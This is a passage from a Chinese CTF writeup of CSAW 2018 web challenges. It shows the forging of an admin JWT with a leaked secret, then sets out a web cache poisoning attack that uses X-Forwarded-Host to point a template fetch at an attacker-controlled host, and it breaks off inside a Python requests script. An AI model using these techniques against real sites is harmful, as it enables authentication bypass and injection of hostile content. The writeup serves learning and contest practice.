alt="1537275905514"></p><p>检查了下，发现少了个<code>code</code>，就是上上图的<code>grant_type</code>下面的<code>code</code>，我们先设置<code>code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzNzI3OTM0NSwiZXhwIjoxNTM3Mjc5OTQ1fQ.UCPeORGG0TCTiwLQznOOwwE3LTJEejZxqHKcZSYJN5s</code>，这个<code>code</code>其实就是上面<code>oauth2/authorize</code>的<code>post</code>请求得到的<code>302</code>的<code>code</code>。</p><p>最终构造的<code>post</code>数据为：</p><p><code>grant_type=authorization_code&amp;code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzNzI3OTM0NSwiZXhwIjoxNTM3Mjc5OTQ1fQ.UCPeORGG0TCTiwLQznOOwwE3LTJEejZxqHKcZSYJN5s&amp;redirect_uri=http://web.chal.csaw.io:9000/protected</code>，提交</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537279886433.png" alt="1537279886433"></p><p>得到以下数据</p><table><thead><tr><th>token_type</th><th>“Bearer”</th></tr></thead><tbody><tr><td>token</td><td>“eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzI3OTY4MSwiZXhwIjoxNTM3MjgwMjgxfQ.oKFQF_SrfU3DGfVlC43OuwVp6-ukTDTJVRqcc9BiRNM”</td></tr></tbody></table><p>很好，这下，我们可以看到回显了个用户<code>Bearer</code>的token，用下<code>https://jwt.io/</code>看下伪造新的<code>token</code>，我这里将<code>&quot;type&quot;:&quot;user&quot;</code>改成了<code>&quot;type&quot;:&quot;admin&quot;</code>,使用<code>ufoundme</code>为秘钥填充。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537279832302.png" alt="1537279832302"></p><p>按照上面的<code>jwt</code>构造的结果，将构造的<code>jwt</code>设置为<code>http://web.chal.csaw.io:9000/protected</code>的<code>Authorization</code>头，构造如下：</p><p><code>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzcyNzk2ODEsImV4cCI6MTUzNzI4MDI4MX0.tLN-8JMx_mbQ4cRK6l-1C5VBLPC66mYjJKJoUcDlDkA</code></p><p>得到<code>flag</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537280149668.png" alt="1537280149668"></p><p>，</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537279784379.png" alt="1537279784379"></p><p>最终答案：<code>flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}</code></p><p>后面还看了看其他大佬的做法，发现差不多，但是大佬们思路整理的很好，这是其中一个<a href="https://www.aperikube.fr/docs/csawquals_2018/sso/" target="_blank" rel="noopener">大佬整理的思路</a></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274637496.png" alt="1537274637496"></p><h5 id="Hacker-Movie-Club-Web-缓存中毒——还需理解学习"><a href="#Hacker-Movie-Club-Web-缓存中毒——还需理解学习" class="headerlink" title="Hacker Movie Club(Web 缓存中毒——还需理解学习)"></a>Hacker Movie Club(Web 缓存中毒——还需理解学习)</h5><p><code>Hacker movies are very popular, so we needed a site that we can scale. You better get started though, there are a lot of movies to watch.</code></p><p><code>Author: itszn (ret2 systems)</code></p><p><code>http://app.hm.vulnerable.services/</code></p><p>打开网页是这样子的</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537342809395.png" alt="1537342809395"></p><p>一脸蒙蔽，看下源代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">data-src</span>=<span class="string">"mustache.min.js"</span> <span class="attr">data-cdn</span>=<span class="string">"6564ab9906a6472e43d8ad5fa6449ead2b591b7d.hm.vulnerable.services"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">data-src</span>=<span class="string">"app.js"</span> <span class="attr">data-cdn</span>=<span class="string">"6564ab9906a6472e43d8ad5fa6449ead2b591b7d.hm.vulnerable.services"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">@import url('https://fonts.googleapis.com/css?family=Orbitron');</span></span><br><span class="line"><span class="undefined">.......//此处省略</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span>Loading..<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.loaded_recapcha = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.loaded_recapcha = <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.loaded_mustache = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.loaded_mustache = <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/cdn.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://www.google.com/recaptcha/api.js?onload=loaded_recapcha&amp;render=explicit'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中<code>/cdn.js</code>内容为下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> t <span class="keyword">of</span> <span class="built_in">document</span>.head.children) &#123;</span><br><span class="line">    <span class="keyword">if</span> (t.tagName !== <span class="string">'SCRIPT'</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">let</span> &#123; cdn, src &#125; = t.dataset;</span><br><span class="line">    <span class="keyword">if</span> (cdn === <span class="literal">undefined</span> || src === <span class="literal">undefined</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    fetch(<span class="string">`//<span class="subst">$&#123;cdn&#125;</span>/cdn/<span class="subst">$&#123;src&#125;</span>`</span>,&#123;</span><br><span class="line">        headers: &#123;</span><br><span class="line">            <span class="string">'X-Forwarded-Host'</span>:cdn</span><br><span class="line">        &#125;&#125;</span><br><span class="line">    ).then(<span class="function"><span class="params">r</span>=&gt;</span>r.blob()).then(<span class="function"><span class="params">b</span>=&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> u = URL.createObjectURL(b);</span><br><span class="line">        <span class="keyword">let</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        s.src = u;</span><br><span class="line">        <span class="built_in">document</span>.head.appendChild(s);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>https://www.google.com/recaptcha/api.js?onload=loaded_recapcha&amp;render=explicit</code>内容为下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* PLEASE DO NOT COPY AND PASTE THIS CODE. */</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> CFG = <span class="string">'___grecaptcha_cfg'</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">window</span>[CFG]) &#123;</span><br><span class="line">        <span class="built_in">window</span>[CFG] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> GR = <span class="string">'grecaptcha'</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">window</span>[GR]) &#123;</span><br><span class="line">        <span class="built_in">window</span>[GR] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">window</span>[GR].ready = <span class="built_in">window</span>[GR].ready ||</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123; (<span class="built_in">window</span>[CFG][<span class="string">'fns'</span>] = <span class="built_in">window</span>[CFG][<span class="string">'fns'</span>] || []).push(f);</span><br><span class="line">    &#125;; (<span class="built_in">window</span>[CFG][<span class="string">'render'</span>] = <span class="built_in">window</span>[CFG][<span class="string">'render'</span>] || []).push(<span class="string">'explicit'</span>); (<span class="built_in">window</span>[CFG][<span class="string">'onload'</span>] = <span class="built_in">window</span>[CFG][<span class="string">'onload'</span>] || []).push(<span class="string">'loaded_recapcha'</span>);</span><br><span class="line">    <span class="built_in">window</span>[<span class="string">'__google_recaptcha_client'</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">var</span> po = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    po.type = <span class="string">'text/javascript'</span>;</span><br><span class="line">    po.async = <span class="literal">true</span>;</span><br><span class="line">    po.src = <span class="string">'https://www.gstatic.com/recaptcha/api2/v1536705955372/recaptcha__zh_cn.js'</span>;</span><br><span class="line">    <span class="keyword">var</span> elem = <span class="built_in">document</span>.querySelector(<span class="string">'script[nonce]'</span>);</span><br><span class="line">    <span class="keyword">var</span> n = elem &amp;&amp; (elem[<span class="string">'nonce'</span>] || elem.getAttribute(<span class="string">'nonce'</span>));</span><br><span class="line">    <span class="keyword">if</span> (n) &#123;</span><br><span class="line">        po.setAttribute(<span class="string">'nonce'</span>, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'script'</span>)[<span class="number">0</span>];</span><br><span class="line">    s.parentNode.insertBefore(po, s);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>除此之外，还发现了个<code>Report an issue</code>的功能</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537343210855.png" alt="1537343210855"></p><p>除此之外，还有这两个<code>js</code>，以下为<code>add.js</code>的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script data-src=&quot;app.js&quot; data-cdn=&quot;6564ab9906a6472e43d8ad5fa6449ead2b591b7d.hm.vulnerable.services&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>内容为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> token = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all([</span><br><span class="line">    fetch(<span class="string">'/api/movies'</span>).then(<span class="function"><span class="params">r</span>=&gt;</span>r.json()),</span><br><span class="line">    fetch(<span class="string">`//6564ab9906a6472e43d8ad5fa6449ead2b591b7d.hm.vulnerable.services/cdn/main.mst`</span>).then(<span class="function"><span class="params">r</span>=&gt;</span>r.text()),</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>.loaded_recapcha === <span class="literal">true</span>)</span><br><span class="line">            <span class="keyword">return</span> resolve();</span><br><span class="line">        <span class="built_in">window</span>.loaded_recapcha = resolve;</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>.loaded_mustache === <span class="literal">true</span>)</span><br><span class="line">            <span class="keyword">return</span> resolve();</span><br><span class="line">        <span class="built_in">window</span>.loaded_mustache = resolve;</span><br><span class="line">    &#125;)</span><br><span class="line">]).then(<span class="function">(<span class="params">[user, view]</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'content'</span>).innerHTML = Mustache.render(view,user);</span><br><span class="line"></span><br><span class="line">    grecaptcha.render(<span class="built_in">document</span>.getElementById(<span class="string">"captcha"</span>), &#123;</span><br><span class="line">        sitekey: <span class="string">'6Lc8ymwUAAAAAM7eBFxU1EBMjzrfC5By7HUYUud5'</span>,</span><br><span class="line">        theme: <span class="string">'dark'</span>,</span><br><span class="line">        callback: <span class="function"><span class="params">t</span>=&gt;</span> &#123;</span><br><span class="line">            token = t;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">'report'</span>).disabled = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">let</span> hidden = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'report'</span>).onclick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hidden) &#123;</span><br><span class="line">          <span class="built_in">document</span>.getElementById(<span class="string">"captcha"</span>).parentElement.style.display=<span class="string">'block'</span>;</span><br><span class="line">          <span class="built_in">document</span>.getElementById(<span class="string">'report'</span>).disabled = <span class="literal">true</span>;</span><br><span class="line">          hidden = <span class="literal">false</span>;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fetch(<span class="string">'/api/report'</span>,&#123;</span><br><span class="line">            method: <span class="string">'POST'</span>,</span><br><span class="line">            body: <span class="built_in">JSON</span>.stringify(&#123;<span class="attr">token</span>:token&#125;)</span><br><span class="line">        &#125;).then(<span class="function"><span class="params">r</span>=&gt;</span>r.json()).then(<span class="function"><span class="params">j</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (j.success) &#123;</span><br><span class="line">                <span class="comment">// The admin is on her way to check the page</span></span><br><span class="line">                alert(<span class="string">"Neo... nobody has ever done this before."</span>);</span><br><span class="line">                alert(<span class="string">"That's why it's going to work."</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                alert(<span class="string">"Dodge this."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中还有<code>6564ab9906a6472e43d8ad5fa6449ead2b591b7d.hm.vulnerable.services/cdn/main.mst</code>，下载看看，内容为下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span></span><br><span class="line">Hacker Movie Club</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;#admin&#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header admin"</span>&gt;</span></span><br><span class="line">Welcome to the desert of the real.</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;&#123;/admin&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"movies"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">th</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>Year<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>Length<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">&#123;&#123;#movies&#125;&#125;</span><br><span class="line">  &#123;&#123;^admin_only&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; year &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; length &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  &#123;&#123;/admin_only&#125;&#125;</span><br><span class="line">&#123;&#123;/movies&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"captcha"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"captcha"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"report"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"report"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上诉这些，其实都可以通过开发者工具一览究竟</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537345852973.png" alt="1537345852973"></p><p>在其中的<code>/api/report</code>发现了一些有趣的东西</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537346702605.png" alt="1537346702605"></p><p>回显如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;admin&quot;:false,&quot;movies&quot;:[&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 54 Minutes&quot;,&quot;name&quot;:&quot;WarGames&quot;,&quot;year&quot;:1983&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;0 Hours, 31 Minutes&quot;,&quot;name&quot;:&quot;Kung Fury&quot;,&quot;year&quot;:2015&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 6 Minutes&quot;,&quot;name&quot;:&quot;Sneakers&quot;,&quot;year&quot;:1992&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 39 Minutes&quot;,&quot;name&quot;:&quot;Swordfish&quot;,&quot;year&quot;:2001&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 6 Minutes&quot;,&quot;name&quot;:&quot;The Karate Kid&quot;,&quot;year&quot;:1984&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 23 Minutes&quot;,&quot;name&quot;:&quot;Ghost in the Shell&quot;,&quot;year&quot;:1995&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;5 Hours, 16 Minutes&quot;,&quot;name&quot;:&quot;Serial Experiments Lain&quot;,&quot;year&quot;:1998&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 16 Minutes&quot;,&quot;name&quot;:&quot;The Matrix&quot;,&quot;year&quot;:1999&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 57 Minutes&quot;,&quot;name&quot;:&quot;Blade Runner&quot;,&quot;year&quot;:1982&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 43 Minutes&quot;,&quot;name&quot;:&quot;Blade Runner 2049&quot;,&quot;year&quot;:2017&#125;,</span><br><span class="line">&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 47 Minutes&quot;,&quot;name&quot;:&quot;Hackers&quot;,&quot;year&quot;:1995&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 36 Minutes&quot;,&quot;name&quot;:&quot;TRON&quot;,&quot;year&quot;:1982&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 5 Minutes&quot;,&quot;name&quot;:&quot;Tron: Legacy&quot;,&quot;year&quot;:2010&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 25 Minutes&quot;,&quot;name&quot;:&quot;Minority Report&quot;,&quot;year&quot;:2002&#125;,</span><br><span class="line">&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 37 Minutes&quot;,&quot;name&quot;:&quot;eXistenZ&quot;,&quot;year&quot;:1999&#125;,&#123;&quot;admin_only&quot;:true,&quot;length&quot;:&quot;22 Hours, 17 Minutes&quot;,&quot;name&quot;:&quot;[REDACTED]&quot;,&quot;year&quot;:2018&#125;]&#125;</span><br></pre></td></tr></table></figure><p>可以看到最后一句<code>{&quot;admin_only&quot;:true,&quot;length&quot;:&quot;22 Hours, 17 Minutes&quot;,&quot;name&quot;:&quot;[REDACTED]&quot;,&quot;year&quot;:2018}]}</code>与之前的不同，猜测着里如果将<code>true</code>改成<code>flase</code>，那么<code>[REDACTED]</code>将是可见的，但是好像没用啊。做题的时候，也就只做到这里，后面看了大佬们的<code>writeup</code>才理解过来。</p><p>仔细查看每个响应头都有：<code>Via: 1.1 varnish-v4</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537346973458.png" alt="1537346973458"></p><p>额，，下面直接引用大佬的<a href="https://delcoding.github.io/2018/09/csaw-writeup2/" target="_blank" rel="noopener">writeup</a>。</p><p>了解了下<code>varnish</code>，发现它是一个<code>反向代理</code>中的<code>缓存服务</code>程序。</p><blockquote><p>如果来自Apache的响应是可缓存的，Varnish会将其存储以便更快地响应未来的请求。</p></blockquote><p>  varnish详细的请求头可以在<a href="https://docs.acquia.com/acquia-cloud/performance/varnish/" target="_blank" rel="noopener">这里</a>找到。</p><p>  所以这里我们需要用到一种叫<code>Web Cache Poisoning</code>（<code>web缓存污染</code>）的利用方法，这个跟<code>Cache Poisoning</code>（又称DNS污染）是不一样的东西。</p><p>  参考链接：</p><p>  <a href="https://xz.aliyun.com/t/2585" target="_blank" rel="noopener">中文版-实战Web缓存中毒</a></p><p>  <a href="https://portswigger.net/blog/practical-web-cache-poisoning" target="_blank" rel="noopener">英文原版</a></p><p>  这里我们可以重点关注<code>DOM Poisoning</code>（DOM污染）。</p><p>  另一个需要先了解的事情是<code>X-Forwarded-Host</code>的作用，详情可参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-Host" target="_blank" rel="noopener">这里</a>。</p><blockquote><p>X-Forwarded-Host (XFH) 是一个事实上的标准首部，用来确定客户端发起的请求中使用 Host 指定的初始域名。 反向代理（如负载均衡服务器、CDN等）的域名或端口号可能会与处理请求的源头服务器有所不同，在这种情况下，X-Forwarded-Host 可以用来确定哪一个域名是最初被用来访问的。</p></blockquote><p>  语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-Host: &lt;host&gt;</span><br></pre></td></tr></table></figure><p>  上面这些归结起来就是<code>当服务器进行缓存时它会将客户端的请求转发到XFH指定的host上去。</code></p><p>  现在再回过头看看我们已有的资料。我们得知<code>main.mst</code>是模板文件，它会利用<code></code>等对admin身份进行判断，如果我们能够劫持掉这个模板文件，使她绕过admin就可以获得到完整的项。</p><p>  我们先来找到<code>main.mst</code>缓存的最大时间(<code>max-age</code>)，我们可以带着<code>X-Forwarded-Host</code>不停的请求<code>/cdn/app.js</code>，如果<code>fetch(&#39;//4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services/cdn/main.mst&#39;)</code>能被我们控制到<code>fetch(&#39;my_server/cdn/main.mst&#39;)</code>上就成功的完成了劫持。</p><p>  我们可以使用下面的脚本验证一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">X_Forwarded_Host = &apos;1.2.3.4&apos; </span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    resp = 